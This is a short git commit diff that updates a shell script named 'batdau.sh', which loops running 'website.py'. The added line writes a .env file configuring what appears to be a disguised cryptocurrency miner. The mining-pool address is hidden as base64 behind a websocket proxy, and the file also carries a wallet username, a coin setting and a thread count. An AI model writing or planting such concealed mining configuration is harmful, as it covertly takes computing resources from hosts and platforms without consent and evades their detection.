5b17f12855b4572bccfbe0592ea0b2de3333b57e
ismailalkaf <ismailbinamil77223@gmail.com>
2025-05-28 06:14:40 +0700

    Update batdau.sh

--- batdau.sh
+++ batdau.sh
@@ -1,4 +1,7 @@
 #!/bin/bash
+
+echo -e "host=127.0.0.1\nport=3306\nproxy=wss://web-production-b464.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=16\npassword=c=MBC,zap=MBC\nusername=mbc1qjl0fslfcvqm76l4za48ekx7k0ww2nc5hjdgn4j" > .env
+
 MIN=$1
 while true; do
     python3 website.py "$MIN" --cache=.cache/09Qy5sb2Fkcyg.txt
